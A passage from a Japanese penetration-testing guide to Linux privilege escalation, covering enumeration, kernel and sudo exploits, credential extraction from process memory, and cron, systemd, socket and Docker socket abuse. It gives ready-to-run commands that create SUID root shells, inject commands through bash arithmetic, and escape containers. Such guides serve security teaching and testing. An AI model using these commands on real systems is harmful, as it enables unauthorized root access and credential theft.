# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中の OS に関する情報を集め始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし**`PATH`変数内の任意のフォルダに書き込み権限がある場合**、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報やパスワード、APIキーは含まれていますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、privilege escalation に使用できる exploit があるか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い vulnerable kernel list といくつかの既に **compiled exploits** はここで見つけることができます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブからすべての vulnerable kernel versions を抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツールは次のとおりです:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (被害者上で実行、カーネル2.x用のexploitsのみチェック)

Always **カーネルバージョンをGoogleで検索してください**、お使いのカーネルバージョンが既知の kernel exploit に記載されている場合、その exploit が有効であることを確認できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

次に示される脆弱な Sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo 1.9.17p1 より前のバージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）は、ユーザーが管理するディレクトリから `/etc/nsswitch.conf` ファイルが使用される場合、非特権のローカルユーザーが sudo `--chroot` オプションを利用して root に権限昇格できる問題があります。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

寄稿: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗しました

この vuln がどのように悪用され得るかの**例**については、**smasher2 box of HTB**を参照してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらに system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいるなら、そこから escape を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

何が**マウントされていて何がアンマウントされているか**、どこで、なぜかを確認してください。何かがアンマウントされている場合は、それをマウントしてプライベートな情報がないか確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**any compiler is installed**か確認してください。これは、kernel exploit を使用する必要がある場合に便利です。使用するマシン（または同様のマシン）でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

インストール済みのパッケージやサービスの**バージョンを確認**してください。例えば古い Nagios バージョンなどがあり、それが exploit されて escalating privileges に利用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _これらのコマンドは大量の情報を表示し、そのほとんどが役に立たない可能性があります。したがって、OpenVASなど、インストールされているソフトウェアのバージョンが既知の exploits に対して脆弱かどうかをチェックするアプリケーションの使用を推奨します_

## プロセス

実行されている**どのプロセス**を確認し、任意のプロセスが**本来より多くの権限**を持っていないかチェックしてください（例えば tomcat が root によって実行されているなど）。
```bash
ps aux
ps -ef
top -n 1
```
常に[**electron/cef/chromium debuggers** が動作していないか確認してください。悪用すれば権限昇格が可能です](electron-cef-chromium-debugger-abuse.md)。**Linpeas** はプロセスのコマンドライン内で `--inspect` パラメータをチェックしてこれらを検出します。\
また、**プロセスのバイナリに対する権限を確認してください**。他人のバイナリを上書きできるかもしれません。

### プロセス監視

プロセスを監視するために [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使えます。これは、脆弱なプロセスが頻繁に実行されている場合や特定の条件が満たされたときにそれらを特定するのに非常に有用です。

### プロセスメモリ

サーバの一部サービスは、**メモリ内に平文で認証情報を保存する**ことがあります。\
通常、他ユーザに属するプロセスのメモリを読み取るには**root権限**が必要なので、これは既にrootでさらに認証情報を発見したい場合に特に有用です。\
ただし、通常ユーザとしては**自身が所有するプロセスのメモリは読める**ことを忘れないでください。

> [!WARNING]
> 現在の多くのマシンではデフォルトで **ptrace を許可していない** ことに注意してください。これは、アンプリヴィレッジドなユーザが所有する他のプロセスをダンプできないことを意味します。
>
> ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ が ptrace の可否を制御します:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であればすべてのプロセスをデバッグできます。これは従来の ptrace の動作です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: ptrace を使えるのは管理者のみ（CAP_SYS_PTRACE が必要）です。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、ptrace を再び有効にするには再起動が必要です。

#### GDB

例えば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の認証情報を検索することができます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示し**、また各マップ領域の**権限を示します**。  
その **mem** 疑似ファイルは **プロセスのメモリ自体を公開します**。  
**maps** ファイルから、どの **メモリ領域が読み取り可能か** とそのオフセットが分かります。  
この情報を使って、**seek into the mem file and dump all readable regions** を行い、ファイルに保存します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### linux向け ProcDump

ProcDump は、Windows 向けの Sysinternals ツールスイートにあるクラシックな ProcDump ツールを Linux 用に再構築したものです。入手: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動で root 要件を削除して、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスメモリからの認証情報

#### 手動の例

authenticator process が動作していることを確認したら：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
processをdumpして（前のセクションを参照してprocessのmemoryをdumpするさまざまな方法を確認してください）memory内のcredentialsを検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、メモリやいくつかの**既知のファイル**から**平文の資格情報を盗みます**。正しく動作させるには root 権限が必要です。

| 機能                                              | プロセス名            |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cron jobs

### Crontab UI (alseambusher) が root として実行されている – web-based scheduler privesc

もし web の “Crontab UI” パネル (alseambusher/crontab-ui) が root として実行され、loopback にのみバインドされている場合でも、SSH ローカルポートフォワーディング経由で到達し、権限昇格のための privileged job を作成できます。

典型的なチェーン
- loopback のみのポート（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で発見
- 運用アーティファクトから認証情報を発見:
  - バックアップ／スクリプト（`zip -P <password>` を使用）
  - systemd ユニットで `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` を公開しているもの
- トンネル作成してログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即実行する (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI を root で実行しない。専用ユーザーと最小権限で制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する。パスワードを使い回さない
- unit files にシークレットを埋め込まない。シークレットストアを使うか、root 専用の EnvironmentFile を使用する
- オンデマンドジョブ実行のために監査/ログを有効にする



スケジュールされたジョブに脆弱性がないか確認する。root で実行されるスクリプトを悪用できるかもしれない（wildcard vuln? root が使用するファイルを変更できるか? symlinks を使う? root が使うディレクトリに特定のファイルを作成する?）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_/etc/crontab_ の中に次の PATH を見つけられます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" が /home/user に書き込み権限を持っている点に注意_)

この crontab 内で root が PATH を設定せずにコマンドやスクリプトを実行しようとすると。例えば: _\* \* \* \* root overwrite.sh_\  
すると、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、それを悪用して予期しない動作（privesc など）を引き起こすことができます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが次のようなパスに続く場合** _**/some/path/\***_ **、脆弱ではありません（_**./\***_ **も同様です）。**

次のページを参照して、ワイルドカードの悪用に関するその他のトリックを確認してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...))、$((...)) および let の算術評価の前に parameter/variable expansion と command substitution を実行します。もし root cron/parser が信頼できないログフィールドを読み取り、それを算術コンテキストに渡している場合、攻撃者は cron 実行時に root として実行される command substitution $(...) を注入できます。

- なぜ動くのか: Bash では展開は次の順序で発生します: parameter/variable expansion、command substitution、arithmetic expansion、その後に word splitting と pathname expansion が行われます。したがって、`$(/bin/bash -c 'id > /tmp/pwn')0` のような値は最初に置換され（コマンドが実行され）、残った数値の `0` が算術に使われるためスクリプトはエラーなく継続します。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 解析されるログに攻撃者制御のテキストを書き込み、数値に見えるフィールドが command substitution を含み末尾が数字になるようにします。コマンドが stdout に出力しない（またはリダイレクトする）ようにして、算術が有効なままになるようにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootが実行するscriptが**directory where you have full access**を使用している場合、そのfolderを削除して、あなたが制御するscriptを置いた別の場所へ**create a symlink folder to another one**することが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron jobs

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを探せます。これを利用して、escalate privileges できるかもしれません。

例えば、**0.1秒ごとに1分間監視し**、**実行回数の少ないコマンドでソートし**、最も多く実行されたコマンドを削除するには、次のように実行できます:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（これは開始されるすべてのプロセスを監視して一覧表示します）。

### 見えない cron jobs

コメントの後に**putting a carriage return after a comment**（改行文字なし）を入れることで cronjob を作成でき、その cron job は動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能であれば、あなたはそれを**変更することができます**ので、それがあなたの**backdoor を実行する**ように**実行**させることができます、サービスが**起動**、**再起動**または**停止**したときに（マシンの再起動を待つ必要があるかもしれません）。\
例えば、.service ファイル内に backdoor を作成し、**`ExecStart=/tmp/script.sh`** のように設定します。

### 書き込み可能な service バイナリ

覚えておいてください、**サービスによって実行されるバイナリに対する書き込み権限を持っている場合**、それらを書き換えて backdoors に置き換えることができ、サービスが再実行されたときに backdoors が実行されます。

### systemd PATH - 相対パス

次のコマンドで**systemd**が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できることが分かった場合、**escalate privileges**できる可能性があります。サービス設定ファイルなどで**relative paths being used on service configurations**が使用されているかを検索する必要があります。例えば：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと同じ名前の**実行可能ファイル**を作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの**backdoor**が実行されます（非特権ユーザーは通常サービスを開始/停止できませんが、`sudo -l` が使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **タイマー**

**タイマー**は名前が `**.timer**` で終わる systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。**タイマー**はカレンダー時刻イベントや単調時刻イベントをネイティブにサポートしており、非同期で実行できるため、cron の代替として利用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、既存の systemd.unit（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントには Unit が次のように説明されています:

> このタイマーが経過したときにアクティブ化するユニット。引数はサフィックスが ".timer" でないユニット名です。指定しない場合、この値はサフィックスを除けばタイマーユニットと同じ名前を持つ service にデフォルトされます（上記参照）。アクティブ化されるユニット名とタイマーユニットのユニット名は、サフィックス以外は同一にすることが推奨されます。

したがって、この権限を悪用するには次のことが必要です:

- `.service` のような、**書き込み可能なバイナリを実行している** systemd ユニットを見つける
- **相対パスを実行している** systemd ユニットを見つけ、かつその実行ファイルを偽装するために**systemd PATH**上に対する**書き込み権限**を持っている

**タイマーの詳細は `man systemd.timer` を参照してください。**

### **タイマーを有効化**

タイマーを有効化するには root 権限が必要で、以下を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意：**timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで**有効化**されます

## ソケット

Unix Domain Sockets (UDS) はクライアント─サーバモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。これらは標準の Unix ディスクリプタファイルを用いてコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

ソケットは `.socket` ファイルを使用して構成できます。

**`man systemd.socket` を参照して sockets について詳しく学んでください。** このファイル内では、いくつか興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約するとソケットが**どこでリッスンするかを示す（AF_UNIX ソケットファイルのパス、リッスンする IPv4/6 および/またはポート番号など）**ためのものです。
- `Accept`: 真偽値を取ります。**true** の場合、**各着信接続ごとにサービスインスタンスが生成され**、接続ソケットのみが渡されます。**false** の場合、すべてのリッスンソケット自体が**起動された service unit に渡され**、すべての接続に対して単一の service unit だけが生成されます。この値はデータグラムソケットや FIFO では無視され、単一の service unit が無条件にすべての着信トラフィックを処理します。**デフォルトは false** です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、リッスンする **sockets**/FIFO がそれぞれ **作成され** バインドされる前または後に**実行されます**。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする **sockets**/FIFO がそれぞれ **閉じられ** 削除される前または後に**実行される**追加の**コマンド**です。
- `Service`: **incoming traffic** 時に**起動する** service unit 名を指定します。この設定は Accept=no のソケットでのみ許可されています。デフォルトではソケットと同名（サフィックスが置き換えられたもの）の service が使われます。ほとんどの場合、このオプションを使う必要はありません。

### 書き込み可能な .socket ファイル

もし **書き込み可能な** `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**でき、バックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があります。**\
_システムがそのソケットファイルの設定を実際に使用している必要があり、そうでなければバックドアは実行されません_

### 書き込み可能なソケット

もし**書き込み可能なソケット**を見つけたら（_ここで指すのは Unix ソケットであり、設定用の `.socket` ファイルではありません_）、そのソケットと**通信できる**ため、脆弱性を悪用できる可能性があります。

### Unix ソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: **sockets listening for HTTP** リクエストを待ち受けているものが存在する可能性があります（_ここで言っているのは .socket ファイルではなく、unix sockets として動作するファイルのことです_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
ソケットが **HTTP リクエストに応答する** 場合、**通信** が可能で、場合によっては **exploit some vulnerability** できるかもしれません。

### 書き込み可能な Docker ソケット

The Docker socket、しばしば `/var/run/docker.sock` に存在するものは、保護が必要な重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込み権限を持っていると、privilege escalation に繋がる可能性があります。以下では、これがどのように行えるか、また Docker CLI が利用できない場合の代替手段を説明します。

#### **Privilege Escalation with Docker CLI**

もし Docker ソケットへの書き込み権限があるなら、次のコマンドを使って権限を昇格できます：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドにより、ホストのファイルシステムに対してroot権限でアクセスできるコンテナを実行できます。

#### **Docker APIを直接使用する方法**

Docker CLIが利用できない場合でも、DockerソケットはDocker APIと`curl`コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得する。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`を使ってコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat`接続を設定した後、ホストのファイルシステムに対してroot権限でコンテナ内から直接コマンドを実行できます。

### その他

docker socketに対して書き込み権限がある（**`docker`グループに所属している**）場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) があることに注意してください。もし[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)なら、それを悪用できる可能性もあります。

dockerからの脱出やdockerをabuseしてescalate privilegesする他の方法については、以下を確認してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし**`ctr`**コマンドを使用できることが判明したら、次のページを参照してください。**you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし**`runc`**コマンドを使用できることが判明したら、次のページを参照してください。**you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Busは高度な **inter-Process Communication (IPC) system** であり、アプリケーションが効率的に相互作用しデータを共有することを可能にします。現代のLinuxシステムを念頭に設計されており、さまざまな形態のアプリケーション間通信のための堅牢なフレームワークを提供します。

このシステムは多用途で、プロセス間のデータ交換を強化する基本的なIPC（**enhanced UNIX domain sockets** を想起させるもの）をサポートします。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetoothデーモンからの着信通知のシグナルにより音楽プレーヤーがミュートされるといった動作が可能になります。加えて、D-Busはリモートオブジェクトの仕組みをサポートしており、アプリケーション間でのサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Busは **allow/deny model** に基づいて動作し、マッチするポリシールールの累積効果に基づいてメッセージ（メソッド呼び出し、シグナル送出など）の権限を管理します。これらのポリシーはバスとのやり取りを指定し、これらの権限の悪用を通じて権限昇格につながる場合があります。

例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーが示されており、rootユーザーが `fi.w1.wpa_supplicant1` を所有し、そのメッセージを送受信できる権限が記述されています。

ユーザーやグループが指定されていないポリシーはすべてに適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされていないものすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここでD-Bus通信のenumerateとexploit方法を学べます：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

ネットワークをenumerateしてマシンの位置を把握するのは常に興味深い。

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセス後は、アクセスする前には操作できなかったマシン上で実行されているネットワークサービスを必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

